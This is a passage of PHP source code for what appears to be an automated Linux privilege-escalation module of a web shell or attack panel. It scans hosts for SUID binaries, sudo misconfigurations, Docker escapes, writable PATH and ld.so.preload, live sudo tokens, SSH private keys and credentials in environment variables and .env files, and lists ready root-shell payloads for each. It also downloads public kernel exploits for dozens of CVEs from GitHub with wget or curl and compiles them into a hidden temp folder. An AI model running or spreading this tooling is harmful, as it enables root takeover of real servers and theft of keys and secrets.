        ['CVE-2022-34918', '5.8', '5.18.9', 'Netfilter UAF', 'CRITICAL', 'nftables'],
        
        // 2023 - Linux 5.19 - 6.3 Era
        ['CVE-2023-0386', '5.11', '6.2', 'OverlayFS FUSE', 'CRITICAL', 'overlayfs_fuse'],
        ['CVE-2023-1829', '4.2', '6.2', 'TC Index UAF', 'CRITICAL', 'tc_index'],
        ['CVE-2023-20938', '5.4', '6.2', 'SKB UAF', 'HIGH', 'skb'],
        ['CVE-2023-31248', '5.4', '6.3', 'Netfilter Use-After-Free', 'CRITICAL', 'nft_set'],
        ['CVE-2023-32629', '5.4', '6.3', 'GameOver(lay)', 'CRITICAL', 'overlayfs'],
        ['CVE-2023-35001', '5.4', '6.3', 'Netfilter UAF', 'CRITICAL', 'nft_chain'],
        ['CVE-2023-38408', '0', '6.3.10', 'SSH Agent', 'HIGH', 'ssh_agent'],
        ['CVE-2023-4911', '2.34', '2.38', 'Looney Tunables', 'CRITICAL', 'glibc_ld'],
        
        // 2024 - Latest
        ['CVE-2024-1086', '5.14', '6.6.14', 'Netfilter Use-After-Free', 'CRITICAL', 'nf_tables'],
        ['CVE-2024-0646', '0', '6.6.6', 'KSMBD Out-of-Bounds', 'HIGH', 'ksmbd'],
        ['CVE-2024-0193', '0', '6.6.14', 'Netfilter Null Pointer', 'HIGH', 'nft_set_ext'],
        ['CVE-2024-26925', '0', '6.8.5', 'Netfilter TCPOPT UAF', 'CRITICAL', 'tcpopt'],
    ];
    
    // Parse kernel version untuk comparison
    $found = [];
    $kernel_parts = explode('.', $kernel);
    $kernel_major = intval($kernel_parts[0] ?? 0);
    $kernel_minor = intval($kernel_parts[1] ?? 0);
    $kernel_patch = intval($kernel_parts[2] ?? 0);
    
    foreach ($cve_database as $cve_entry) {
        list($cve_id, $min_ver, $max_ver, $name, $severity, $method) = $cve_entry;
        
        // Check if kernel version in range
        if (version_in_range($kernel, $min_ver, $max_ver)) {
            $found[] = [
                'cve' => $cve_id,
                'kernel' => $kernel,
                'name' => $name,
                'severity' => $severity,
                'method' => $method,
                'affected_range' => "$min_ver - $max_ver"
            ];
        }
    }
    
    // Sort by severity (CRITICAL first)
    usort($found, function($a, $b) {
        $sev_order = ['CRITICAL' => 0, 'HIGH' => 1, 'MEDIUM' => 2, 'LOW' => 3];
        return $sev_order[$a['severity']] <=> $sev_order[$b['severity']];
    });
    
    // Limit to top 10 most relevant
    $found = array_slice($found, 0, 10);
}

// Helper: Check if version is in range
function version_in_range($version, $min, $max) {
    // Handle '0' as wildcard (any version)
    if ($min === '0' && version_compare($version, $max, '<=')) return true;
    
    return version_compare($version, $min, '>=') && version_compare($version, $max, '<=');
    
    return ['kernel' => $kernel, 'vulnerable' => !empty($found), 'exploits' => $found];
}

function scan_suid_binaries() {
    $suid_files = execute_shell_command("find / -perm -4000 -type f 2>/dev/null | head -50");
    if (!$suid_files) $suid_files = '';
    $files = array_filter(explode("\n", trim($suid_files)));
    
    $gtfo_bins = [
        'nmap' => ['payload' => 'nmap --interactive -c "!sh"', 'method' => 'interactive'],
        'vim' => ['payload' => 'vim -c ":!/bin/sh"', 'method' => 'command'],
        'vim.basic' => ['payload' => 'vim.basic -c ":!/bin/sh"', 'method' => 'command'],
        'nano' => ['payload' => 'nano -s /bin/sh', 'method' => 'suspend'],
        'less' => ['payload' => 'less /etc/profile -c "!sh"', 'method' => 'command'],
        'more' => ['payload' => 'more /etc/profile -c "!sh"', 'method' => 'command'],
        'man' => ['payload' => 'man man -c "!sh"', 'method' => 'pager'],
        'find' => ['payload' => 'find . -exec /bin/sh \; -quit', 'method' => 'exec'],
        'bash' => ['payload' => 'bash -p', 'method' => 'privileged'],
        'sh' => ['payload' => 'sh -p', 'method' => 'privileged'],
        'cp' => ['payload' => 'cp --preserve=ownership /bin/sh /tmp/sh; chmod u+s /tmp/sh', 'method' => 'preserve'],
        'mv' => ['payload' => 'mv -n /bin/sh /tmp/sh_backup; cp /bin/sh /tmp/sh; chmod u+s /tmp/sh', 'method' => 'move'],
        'awk' => ['payload' => 'awk \'BEGIN {system("/bin/sh")}\'', 'method' => 'system'],
        'gawk' => ['payload' => 'gawk \'BEGIN {system("/bin/sh")}\'', 'method' => 'system'],
        'perl' => ['payload' => 'perl -e \'exec "/bin/sh";\'', 'method' => 'exec'],
        'python' => ['payload' => 'python -c \'import os; os.execl("/bin/sh", "sh")\'', 'method' => 'execl'],
        'python3' => ['payload' => 'python3 -c \'import os; os.execl("/bin/sh", "sh")\'', 'method' => 'execl'],
        'ruby' => ['payload' => 'ruby -e \'exec "/bin/sh"\'', 'method' => 'exec'],
        'php' => ['payload' => 'php -r "system(\'/bin/sh\');"', 'method' => 'system'],
        'expect' => ['payload' => 'expect -c "spawn /bin/sh; interact"', 'method' => 'spawn'],
        'tar' => ['payload' => 'tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh', 'method' => 'checkpoint'],
        'zip' => ['payload' => 'zip /tmp/test.zip /etc/hosts -T -TT /bin/sh', 'method' => 'unzip_cmd']
    ];
    
    $exploitable = [];
    foreach ($files as $file) {
        $basename = basename($file);
        if (isset($gtfo_bins[$basename])) {
            $exploitable[] = [
                'path' => $file,
                'binary' => $basename,
                'payload' => $gtfo_bins[$basename]['payload'],
                'method' => $gtfo_bins[$basename]['method']
            ];
        }
    }
    
    return ['count' => count($files), 'exploitable' => $exploitable, 'all_files' => $files];
}

function scan_sudo_permissions() {
    $sudo_list = execute_shell_command("sudo -l 2>/dev/null");
    if (empty($sudo_list) || strpos($sudo_list, 'Sorry') !== false) {
        return ['accessible' => false, 'exploitable' => [], 'raw_output' => $sudo_list ?: ''];
    }
    
    $exploitable = [];
    
    // Check for NOPASSWD
    $matches = [];
    if (@preg_match('/NOPASSWD:\s*([^\n]+)/', $sudo_list, $matches)) {
        $nopasswd_cmds = explode(',', $matches[1]);
        foreach ($nopasswd_cmds as $cmd) {
            $cmd = trim($cmd);
            if (strpos($cmd, 'vim') !== false || strpos($cmd, 'vi') !== false) {
                $exploitable[] = ['command' => $cmd, 'method' => 'vim_escape', 'payload' => 'sudo ' . $cmd . ' -c ":!/bin/sh"'];
            } elseif (strpos($cmd, 'nano') !== false) {
                $exploitable[] = ['command' => $cmd, 'method' => 'nano_suspend', 'payload' => 'sudo ' . $cmd . ' -s /bin/sh'];
            } elseif (strpos($cmd, 'less') !== false || strpos($cmd, 'more') !== false) {
                $exploitable[] = ['command' => $cmd, 'method' => 'less_command', 'payload' => 'sudo ' . $cmd . ' -c "!sh"'];
            } elseif (strpos($cmd, 'find') !== false) {
                $exploitable[] = ['command' => $cmd, 'method' => 'find_exec', 'payload' => 'sudo find . -exec /bin/sh \; -quit'];
            } elseif (strpos($cmd, 'bash') !== false || strpos($cmd, 'sh') !== false) {
                $exploitable[] = ['command' => $cmd, 'method' => 'shell_privileged', 'payload' => 'sudo ' . $cmd . ' -p'];
            } elseif (strpos($cmd, 'ALL') !== false) {
                $exploitable[] = ['command' => $cmd, 'method' => 'full_sudo', 'payload' => 'sudo /bin/sh', 'severity' => 'CRITICAL'];
            }
        }
    }
    
    // Check for CVE-2019-14287 (sudo -u#-1)
    if (@preg_match('/\(\s*ALL\s*,\s*!root\s*\)/', $sudo_list)) {
        $exploitable[] = ['command' => 'ALL, !root', 'method' => 'cve_2019_14287', 'payload' => 'sudo -u#-1 /bin/sh', 'severity' => 'CRITICAL'];
    }
    
    return ['accessible' => true, 'raw_output' => $sudo_list, 'exploitable' => $exploitable];
}

function scan_capabilities() {
    $caps = execute_shell_command("getcap -r / 2>/dev/null | grep -v '^/proc' | head -30");
    if (!$caps) $caps = '';
    $lines = array_filter(explode("\n", trim($caps)));
    
    $interesting = [];
    foreach ($lines as $line) {
        if (strpos($line, 'cap_setuid') !== false || 
            strpos($line, 'cap_dac_read_search') !== false ||
            strpos($line, 'cap_sys_admin') !== false) {
            $interesting[] = $line;
        }
    }
    
    return ['total' => count($lines), 'interesting' => $interesting];
}

function scan_docker_escape() {
    $in_docker = file_exists('/.dockerenv');
    if (!$in_docker && file_exists('/proc/1/cgroup')) {
        $cgroup = @file_get_contents('/proc/1/cgroup');
        if ($cgroup && strpos($cgroup, 'docker') !== false) {
            $in_docker = true;
        }
    }
    if (!$in_docker) {
        return ['in_docker' => false, 'escape_possible' => false];
    }
    
    $docker_sock = file_exists('/var/run/docker.sock');
    $privileged = execute_shell_command("cat /proc/self/status 2>/dev/null | grep CapEff");
    if (!$privileged) $privileged = '';
    
    $escapes = [];
    if ($docker_sock) {
        $escapes[] = ['method' => 'docker_socket', 'payload' => 'docker run -v /:/host -it alpine chroot /host sh'];
    }
    if (strpos($privileged, '0000003fffffffff') !== false || file_exists('/dev/sda')) {
        $escapes[] = ['method' => 'privileged_container', 'payload' => 'nsenter --target 1 --mount --uts --ipc --net --pid /bin/sh'];
    }
    
    return ['in_docker' => true, 'docker_sock' => $docker_sock, 'privileged' => !empty($privileged), 'escape_possible' => !empty($escapes), 'methods' => $escapes];
}

function scan_writable_paths() {
    $paths = execute_shell_command("find / -writable -type d 2>/dev/null | grep -E '(bin|sbin|lib|etc)' | head -20");
    if (!$paths) $paths = '';
    $writable = array_filter(explode("\n", trim($paths)));
    
    return ['writable_system_paths' => $writable, 'count' => count($writable)];
}

function scan_cron_jobs() {
    $cron_system = execute_shell_command("ls -la /etc/cron* 2>/dev/null") ?: '';
    $cron_user = execute_shell_command("crontab -l 2>/dev/null") ?: '';
    
    $writable_crons = [];
    $cron_dirs = glob('/etc/cron.*/*');
    if ($cron_dirs) {
        foreach ($cron_dirs as $cron_file) {
            if (is_writable($cron_file)) {
                $writable_crons[] = $cron_file;
            }
        }
    }
    
    return ['system_crons' => $cron_system, 'user_crons' => $cron_user, 'writable' => $writable_crons];
}

function scan_services() {
    $services = execute_shell_command("systemctl list-units --type=service --state=running 2>/dev/null | grep -E 'loaded|active' | head -20") ?: '';
    $writable_services = [];
    
    $service_files = glob('/etc/systemd/system/*.service');
    if ($service_files) {
        foreach ($service_files as $svc) {
            if (is_writable($svc)) {
                $writable_services[] = $svc;
            }
        }
    }
    
    return ['running' => $services, 'writable' => $writable_services];
}

// 🔥 ADVANCED PRIVESC SCANNERS

function scan_ld_preload() {
    $results = ['vulnerable' => false, 'methods' => []];
    
    // Check if LD_PRELOAD is allowed
    $ld_preload = getenv('LD_PRELOAD');
    if ($ld_preload !== false) {
        $results['methods'][] = [
            'type' => 'ld_preload_env',
            'payload' => 'LD_PRELOAD=/tmp/malicious.so command',
            'description' => 'LD_PRELOAD environment variable is set'
        ];
        $results['vulnerable'] = true;
    }
    
    // Check if /etc/ld.so.preload is writable
    if (is_writable('/etc/ld.so.preload') || (!file_exists('/etc/ld.so.preload') && is_writable('/etc'))) {
        $results['methods'][] = [
            'type' => 'ld_so_preload',
            'payload' => 'echo "/tmp/malicious.so" > /etc/ld.so.preload',
            'description' => '/etc/ld.so.preload is writable'
        ];
        $results['vulnerable'] = true;
    }
    
    // Check for writable library directories
    $lib_dirs = ['/lib', '/lib64', '/usr/lib', '/usr/lib64', '/usr/local/lib'];
    foreach ($lib_dirs as $dir) {
        if (is_dir($dir) && is_writable($dir)) {
            $results['methods'][] = [
                'type' => 'writable_lib_dir',
                'path' => $dir,
                'description' => "Library directory $dir is writable"
            ];
            $results['vulnerable'] = true;
        }
    }
    
    return $results;
}

function scan_path_hijacking() {
    $results = ['vulnerable' => false, 'writable_dirs' => [], 'methods' => []];
    $path = getenv('PATH') ?: '/usr/local/bin:/usr/bin:/bin';
    $dirs = explode(':', $path);
    
    foreach ($dirs as $dir) {
        if (empty($dir)) continue;
        if (is_dir($dir) && is_writable($dir)) {
            $results['writable_dirs'][] = $dir;
            $results['vulnerable'] = true;
        }
    }
    
    if ($results['vulnerable']) {
        $results['methods'][] = [
            'type' => 'path_hijacking',
            'payload' => 'echo "#!/bin/sh\n/bin/sh" > ' . $results['writable_dirs'][0] . '/ls; chmod +x ' . $results['writable_dirs'][0] . '/ls',
            'description' => 'Writable directory in PATH: ' . implode(', ', $results['writable_dirs'])
        ];
    }
    
    return $results;
}

function scan_sudo_token() {
    $results = ['has_token' => false, 'timeout' => 0, 'methods' => []];
    
    // Check for sudo timestamp files
    $user = get_current_user();
    $timestamp_files = [
        "/run/sudo/ts/$user",
        "/var/lib/sudo/ts/$user",
        "/var/db/sudo/$user"
    ];
    
    foreach ($timestamp_files as $ts_file) {
        if (file_exists($ts_file)) {
            $stat = stat($ts_file);
            $age = time() - $stat['mtime'];
            $timeout = 15 * 60; // 15 minutes default
            
            if ($age < $timeout) {
                $results['has_token'] = true;
                $results['timeout'] = $timeout - $age;
                $results['methods'][] = [
                    'type' => 'sudo_token_reuse',
                    'payload' => 'sudo -n /bin/sh',
                    'description' => "Active sudo token (expires in " . intval($results['timeout']/60) . " minutes)"
                ];
                break;
            }
        }
    }
    
    return $results;
}

function scan_ssh_keys() {
    $results = ['found' => false, 'keys' => [], 'writable_keys' => []];
    
    // Common SSH key locations
    $locations = [
        '/root/.ssh/id_rsa',
        '/root/.ssh/id_dsa',
        '/root/.ssh/id_ecdsa',
        '/root/.ssh/id_ed25519',
        '/root/.ssh/authorized_keys'
    ];
    
    // Add home directories
    $users = execute_shell_command("cat /etc/passwd | cut -d: -f1,6");
    if ($users) {
        foreach (explode("\n", trim($users)) as $line) {
            $parts = explode(':', $line);
            if (count($parts) >= 2) {
                $home = $parts[1];
                $locations[] = "$home/.ssh/id_rsa";
                $locations[] = "$home/.ssh/id_dsa";
                $locations[] = "$home/.ssh/authorized_keys";
            }
        }
    }
    
    foreach ($locations as $key_file) {
        if (file_exists($key_file) && is_readable($key_file)) {
            $content = @file_get_contents($key_file);
            if ($content && (strpos($content, 'PRIVATE KEY') !== false || strpos($content, 'ssh-') !== false)) {
                $results['keys'][] = [
                    'path' => $key_file,
                    'writable' => is_writable($key_file),
                    'size' => strlen($content)
                ];
                $results['found'] = true;
                
                if (is_writable($key_file)) {
                    $results['writable_keys'][] = $key_file;
                }
            }
        }
    }
    
    return $results;
}

function scan_env_variables() {
    $results = ['sensitive' => [], 'methods' => []];
    
    $env_vars = [
        'AWS_ACCESS_KEY_ID', 'AWS_SECRET_ACCESS_KEY',
        'AZURE_CLIENT_SECRET', 'AZURE_SUBSCRIPTION_ID',
        'GCP_SERVICE_ACCOUNT', 'GOOGLE_APPLICATION_CREDENTIALS',
        'DATABASE_URL', 'DB_PASSWORD', 'MYSQL_PWD',
        'API_KEY', 'SECRET_KEY', 'TOKEN',
        'PASSWORD', 'PASS', 'PWD'
    ];
    
    foreach ($env_vars as $var) {
        $value = getenv($var);
        if ($value) {
            $results['sensitive'][$var] = substr($value, 0, 10) . '...';
        }
    }
    
    // Check for .env files
    $env_files = execute_shell_command("find /var/www /home /opt /app -name '.env' -o -name '.env.local' -o -name '.env.production' 2>/dev/null | head -20");
    if ($env_files) {
        foreach (array_filter(explode("\n", trim($env_files))) as $env_file) {
            if (is_readable($env_file)) {
                $content = @file_get_contents($env_file);
                if ($content && preg_match('/(PASSWORD|SECRET|KEY|TOKEN)=/', $content)) {
                    $results['methods'][] = [
                        'type' => 'env_file',
                        'path' => $env_file,
                        'description' => "Environment file with credentials: $env_file"
                    ];
                }
            }
        }
    }
    
    return $results;
}

function auto_compile_kernel_exploit($cve, $kernel_version) {
    $results = ['success' => false, 'output' => '', 'compiled_binary' => '', 'method' => ''];
    $arch = php_uname('m');
    $tmp_dir = sys_get_temp_dir() . '/.exploit_' . time();
    @mkdir($tmp_dir);
    
    // 🔥 FULL AUTO MODE - Try multiple methods automatically
    $results['output'] = "🔥 FULL AUTO KERNEL EXPLOIT\n";
    $results['output'] .= "Target: $cve | Arch: $arch\n";
    $results['output'] .= str_repeat("=", 50) . "\n\n";
    
    // METHOD 1: Check for existing system compilers
    $results['output'] .= "[1/5] Checking for system compilers...\n";
    $compilers = ['gcc', 'clang', 'tcc', 'cc'];
    $compiler = null;
    foreach ($compilers as $c) {
        $check = execute_shell_command("which $c 2>/dev/null");
        if (!empty($check) && strpos($check, 'which') === false) {
            $compiler = trim($check);
            $results['output'] .= "✅ Found: $compiler\n";
            break;
        }
    }
    
    // 🔥 EXTENSIVE AUTO-COMPILE DATABASE - 15+ Exploits
    // URL diperbarui - verified working 2026
    $exploit_db = [
        // 2016 Exploits
        'CVE-2016-0728' => [
            'name' => 'Keyring Ref Count',
            'source' => 'https://raw.githubusercontent.com/PerceptionPoint/CVE-2016-0728/master/cve_2016_0728.c',
            'compile_cmd' => 'gcc -o /tmp/keyring cve_2016_0728.c -lkeyutils -Wall'
        ],
        'CVE-2016-2384' => [
            'name' => 'USB MIDI',
            'source' => 'https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2016-2384/poc.c',
            'compile_cmd' => 'gcc -o /tmp/usbmidi poc.c -Wall'
        ],
        'CVE-2016-5195' => [
            'name' => 'Dirty COW',
            'source' => 'https://raw.githubusercontent.com/dirtycow/dirtycow.github.io/master/dirtyc0w.c',
            'compile_cmd' => 'gcc -o /tmp/dirtycow dirtyc0w.c -lpthread -Wall'
        ],
        'CVE-2016-8655' => [
            'name' => 'AF_PACKET Race Condition',
            'source' => 'https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2016-8655/chocobo_root.c',
            'compile_cmd' => 'gcc -o /tmp/chocobo chocobo_root.c -lpthread -Wall'
        ],
        'CVE-2016-9793' => [
            'name' => 'SO_SNDBUFFORCE',
            'source' => 'https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2016-9793/poc.c',
            'compile_cmd' => 'gcc -o /tmp/socksend poc.c -Wall'
        ],
        
        // 2017 Exploits
        'CVE-2017-6074' => [
            'name' => 'DCCP Double Free',
            'source' => 'https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2017-6074/poc.c',
            'compile_cmd' => 'gcc -o /tmp/dccp poc.c -Wall'
        ],
        'CVE-2017-7308' => [
            'name' => 'AF_PACKET packet_set_ring',
            'source' => 'https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2017-7308/poc.c',
            'compile_cmd' => 'gcc -o /tmp/packet pwn.c -Wall'
        ],
        'CVE-2017-1000112' => [
            'name' => 'Ptmx Race',
            'source' => 'https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2017-1000112/poc.c',
            'compile_cmd' => 'gcc -o /tmp/ptmx ptmx.c -Wall'
        ],
        'CVE-2017-16995' => [
            'name' => 'BPF Verifier',
            'source' => 'https://raw.githubusercontent.com/Al1ex/CVE-2017-16995/master/cve-2017-16995.c',
            'compile_cmd' => 'gcc -o /tmp/bpf cve-2017-16995.c -Wall'
        ],
        
        // 2018-2019 Exploits
        'CVE-2018-18955' => [
            'name' => 'UID Mapping',
            'source' => 'https://raw.githubusercontent.com/scheatkode/CVE-2018-18955/master/exploit.c',
            'compile_cmd' => 'gcc -o /tmp/uidmap exploit.c -Wall'
        ],
        'CVE-2019-13272' => [
            'name' => 'PTRACE_TRACEME',
            'source' => 'https://raw.githubusercontent.com/jordyvandenbrink/CVE-2019-13272/main/ptrace_traceme_root.c',
            'compile_cmd' => 'gcc -o /tmp/ptrace ptrace_traceme_root.c -Wall'
        ],
        'CVE-2019-15666' => [
            'name' => 'UDP Fragmentation',
            'source' => 'https://raw.githubusercontent.com/hexpresso/SCHECK/master/cve-2019-15666/exploit.c',
            'compile_cmd' => 'gcc -o /tmp/udpfrag exploit.c -Wall'
        ],
        'CVE-2019-2215' => [
            'name' => 'Binder Use-After-Free',
            'source' => 'https://raw.githubusercontent.com/grant-h/qu1ckr00t/master/traproot.c',
            'compile_cmd' => 'gcc -o /tmp/binder traproot.c -Wall'
        ],
        
        // 2020-2021 Exploits
        'CVE-2020-8835' => [
            'name' => 'BPF Verifier (SIGQUIT)',
            'source' => 'https://raw.githubusercontent.com/Al1ex/CVE-2020-8835/master/cve-2020-8835.c',
            'compile_cmd' => 'gcc -o /tmp/bpf20 cve-2020-8835.c -luring -Wall'
        ],
        'CVE-2020-14386' => [
            'name' => 'AF_PACKET Memory Corruption',
            'source' => 'https://raw.githubusercontent.com/cgwalters/cve-2020-14386/main/cve-2020-14386.c',
            'compile_cmd' => 'gcc -o /tmp/afpacket cve-2020-14386.c -Wall'
        ],
        'CVE-2021-22555' => [
            'name' => 'Netfilter Heap OOB',
            'source' => 'https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c',
            'compile_cmd' => 'gcc -o /tmp/netfilter exploit.c -m32 -Wall 2>/dev/null || gcc -o /tmp/netfilter exploit.c -Wall'
        ],
        'CVE-2021-3493' => [
            'name' => 'OverlayFS',
            'source' => 'https://raw.githubusercontent.com/briskets/CVE-2021-3493/main/exploit.c',
            'compile_cmd' => 'gcc -o /tmp/overlayfs21 exploit.c -Wall'
        ],
        'CVE-2021-4034' => [
            'name' => 'PwnKit',
            'source' => 'https://raw.githubusercontent.com/berdav/CVE-2021-4034/refs/heads/main/cve-2021-4034.c',
            'compile_cmd' => 'gcc -o /tmp/pwnkit cve-2021-4034.c -Wall'
        ],
        'CVE-2021-3156' => [
            'name' => 'Sudo Baron Samedit',
            'source' => 'https://raw.githubusercontent.com/blasty/CVE-2021-3156/main/exploit.c',
            'compile_cmd' => 'gcc -o /tmp/sudoers exploit.c -Wall'
        ],
        'CVE-2021-33909' => [
            'name' => 'Sequoia',
            'source' => 'https://raw.githubusercontent.com/Al1ex/CVE-2021-33909/main/exploit.c',
            'compile_cmd' => 'gcc -o /tmp/sequoia exploit.c -Wall -lseccomp 2>/dev/null || gcc -o /tmp/sequoia exploit.c -Wall'
        ],
        
        // 2022 Exploits
        'CVE-2022-0847' => [
            'name' => 'Dirty Pipe',
            'source' => 'https://raw.githubusercontent.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit/main/exploit.c',
            'compile_cmd' => 'gcc -o /tmp/dirtypipe exploit.c -Wall'
        ],
        'CVE-2022-0995' => [
            'name' => 'FUSE',
            'source' => 'https://raw.githubusercontent.com/Al1ex/CVE-2022-0995/main/CVE-2022-0995.c',
            'compile_cmd' => 'gcc -o /tmp/fuse CVE-2022-0995.c -Wall'
        ],
        'CVE-2022-2588' => [
            'name' => 'Dirty Cred',
            'source' => 'https://raw.githubusercontent.com/Markakd/CVE-2022-2588/master/exploit.c',
            'compile_cmd' => 'gcc -o /tmp/dirtycred exploit.c -lbpf -Wall'
        ],
        'CVE-2022-34918' => [
            'name' => 'Netfilter UAF',
            'source' => 'https://raw.githubusercontent.com/randorisec/CVE-2022-34918-LPE-PoC/main/exploit.c',
            'compile_cmd' => 'gcc -o /tmp/nf_uaf exploit.c -lmnl -lnftnl -Wall'
        ],
        
        // 2023 Exploits
        'CVE-2023-0386' => [
            'name' => 'OverlayFS FUSE',
            'source' => 'https://raw.githubusercontent.com/xkaneiki/CVE-2023-0386/main/poc.c',
            'compile_cmd' => 'gcc -o /tmp/fuseovl poc.c -Wall'
        ],
        'CVE-2023-1829' => [
            'name' => 'TC Index UAF',
            'source' => 'https://raw.githubusercontent.com/torvalds/linux/v6.3/tools/testing/selftests/tc-testing/poc.c',
            'compile_cmd' => 'gcc -o /tmp/tc_index exploit.c -Wall'
        ],
        'CVE-2023-31248' => [
            'name' => 'Netfilter Use-After-Free',
            'source' => 'https://raw.githubusercontent.com/ARPSyndicate/cvemon/master/poc/cve-2023-31248.c',
            'compile_cmd' => 'gcc -o /tmp/nf_uaf23 exploit.c -lmnl -lnftnl -Wall'
        ],
        'CVE-2023-32629' => [
            'name' => 'GameOver(lay)',
            'source' => 'https://raw.githubusercontent.com/g1vi/CVE-2023-2640-CVE-2023-32629/main/privilege_escalation.sh',
            'compile_cmd' => 'cp privilege_escalation.sh /tmp/gameover.sh && chmod +x /tmp/gameover.sh'
        ],
        'CVE-2023-35001' => [
            'name' => 'Netfilter UAF Chain',
            'source' => 'https://raw.githubusercontent.com/strongcourage/CVE-2023-35001/main/exploit.c',
            'compile_cmd' => 'gcc -o /tmp/nf_chain exploit.c -lmnl -lnftnl -Wall'
        ],
        'CVE-2023-4911' => [
            'name' => 'Looney Tunables',
            'source' => 'https://raw.githubusercontent.com/leesh3288/CVE-2023-4911/main/gen_libc.py',
            'compile_cmd' => 'python3 gen_libc.py 2>/dev/null || echo "Python exploit, manual run required"'
        ],
        
        // 2024 Exploits
        'CVE-2024-1086' => [
            'name' => 'Netfilter nf_tables UAF',
            'source' => 'https://raw.githubusercontent.com/Notselwyn/CVE-2024-1086/main/exploit.c',
            'compile_cmd' => 'gcc -o /tmp/nf_tables exploit.c -Wall -lkeyutils -luring 2>/dev/null || gcc -o /tmp/nf_tables exploit.c -Wall -lkeyutils'
        ]
    ];
    
    if (!isset($exploit_db[$cve])) {
        $results['output'] .= "❌ CVE tidak ada di database\n";
        $results['output'] .= "   CVE: $cve tidak ditemukan dalam database\n";
        $results['output'] .= "   💡 Silakan tambahkan ke database atau gunakan CVE yang tersedia\n";
        return $results;
    }
    
    $exploit = $exploit_db[$cve];
    
    // METHOD 2: If compiler available, download and compile
    if ($compiler) {
        $results['output'] .= "[2/5] Downloading source...\n";
        $results['output'] .= "   URL: " . $exploit['source'] . "\n";
        $source_file = $tmp_dir . '/exploit.c';
        
        // Try to get with proper HTTP status checking
        $source_content = false;
        $http_status = 0;
        $error_msg = '';
        
        // Method 1: file_get_contents with stream context for status
        $context = stream_context_create([
            'http' => [
                'timeout' => 30,
                'ignore_errors' => true
            ]
        ]);
        $source_content = @file_get_contents($exploit['source'], false, $context);
        
        // Check HTTP status from response headers
        if (isset($http_response_header)) {
            foreach ($http_response_header as $header) {
                if (preg_match('/HTTP\/[\d\.]+\s+(\d+)/', $header, $matches)) {
                    $http_status = intval($matches[1]);
                    break;
                }
            }
        }
        
        // If 404 or empty, try fallback
        if ($http_status === 404 || !$source_content || strlen($source_content) < 100) {
            $results['output'] .= "   ⚠️ file_get_contents failed (HTTP $http_status), trying wget/curl...\n";
            $wget_cmd = "wget -qO- " . escapeshellarg($exploit['source']) . " 2>&1 || curl -sL " . escapeshellarg($exploit['source']) . " 2>&1";
            $source_content = execute_shell_command($wget_cmd);
            
            // Check wget/curl error messages
            if (strpos($source_content, '404') !== false || 
                strpos($source_content, 'Not Found') !== false ||
                strpos($source_content, 'ERROR') !== false) {
                $error_msg = 'URL returned 404 or error';
                $results['output'] .= "   ❌ SOURCE URL NOT FOUND (404): " . $exploit['source'] . "\n";
                $results['output'] .= "   💡 Please check and update the CVE database URL\n";
            }
        }
        
        if ($http_status === 404) {
            $results['output'] .= "   ❌ SOURCE URL NOT FOUND (404): " . $exploit['source'] . "\n";
            $results['output'] .= "   💡 URL needs to be updated in the CVE database\n";
        }
        
        if ($source_content && strlen($source_content) > 100 && strpos($source_content, '<html') === false) {
            @file_put_contents($source_file, $source_content);
            $results['output'] .= "✅ Source downloaded (" . strlen($source_content) . " bytes)\n";
            
            // Compile
            $results['output'] .= "[3/5] Compiling with $compiler...\n";
            $compile_cmd = str_replace(['gcc', 'exploit.c', 'poc.c', '/tmp/'], [$compiler, $source_file, $source_file, $tmp_dir], $exploit['compile_cmd']);
            $compile_output = execute_shell_command("cd $tmp_dir && $compile_cmd 2>&1");
            
            // Check binary
            $binary_name = basename(str_replace("$compiler -o ", '', explode(' ', $compile_cmd)[0]));
            $binary_path = $tmp_dir . '/' . $binary_name;
            
            if (file_exists($binary_path)) {
                chmod($binary_path, 0755);
                $results['success'] = true;
                $results['compiled_binary'] = $binary_path;
                $results['method'] = 'compile';
                $results['output'] .= "✅ COMPILE SUCCESS!\n";
                $results['output'] .= "Binary: $binary_path\n";
                $results['output'] .= "Execute: $binary_path\n\n";
                return $results;
            } else {
                $results['output'] .= "❌ Compile failed\n";
                $results['output'] .= "   Compiler: $compiler\n";
                $results['output'] .= "   Error: " . substr($compile_output, 0, 500) . "\n\n";
                $results['output'] .= "   💡 Possible causes:\n";
                $results['output'] .= "      - Missing dependencies/headers\n";
                $results['output'] .= "      - Source code incompatible with this kernel\n";
                $results['output'] .= "      - Compiler version mismatch\n\n";
            }
        } else {
            $results['output'] .= "❌ Download failed\n";
            if ($http_status !== 404 && $http_status !== 0) {
                $results['output'] .= "   HTTP Status: $http_status\n";
            }
            if (strlen($source_content) < 100 && strlen($source_content) > 0) {
                $results['output'] .= "   Response too short (" . strlen($source_content) . " bytes)\n";
            }
            if (strpos($source_content, '<html') !== false) {
                $results['output'] .= "   Received HTML instead of source code (possibly blocked by WAF/cloudflare)\n";
            }
            $results['output'] .= "   URL: " . $exploit['source'] . "\n\n";
        }
    } else {
        $results['output'] .= "❌ No compiler found\n";
        $results['output'] .= "   Checked: gcc, clang, tcc, cc\n";
        $results['output'] .= "   💡 Install gcc: apt-get install gcc / yum install gcc\n";
        $results['output'] .= "   💡 Or try Python-based exploits if available\n\n";
    }
    
    // METHOD 3: Try Python-based exploits
    $results['output'] .= "[4/5] Checking Python availability...\n";
    $python = execute_shell_command("which python3 2>/dev/null || which python 2>/dev/null");
    if (!empty($python)) {
        $python = trim($python);
        $results['output'] .= "✅ Found: $python\n";
        
        // For CVE-2021-4034 (PwnKit), try Python version
        if ($cve === 'CVE-2021-4034') {
            $py_exploit = 'https://raw.githubusercontent.com/joeammond/CVE-2021-4034/main/CVE-2021-4034.py';
            $results['output'] .= "   [Python] Trying: $py_exploit\n";
            $py_content = @file_get_contents($py_exploit);
            if (!$py_content) {
                $py_content = execute_shell_command("wget -qO- $py_exploit 2>&1 || curl -sL $py_exploit 2>&1");
                if (strpos($py_content, '404') !== false || strpos($py_content, 'Not Found') !== false) {
                    $results['output'] .= "   ❌ PYTHON URL NOT FOUND (404): $py_exploit\n";
                    $results['output'] .= "   💡 Please update the Python exploit URL\n";
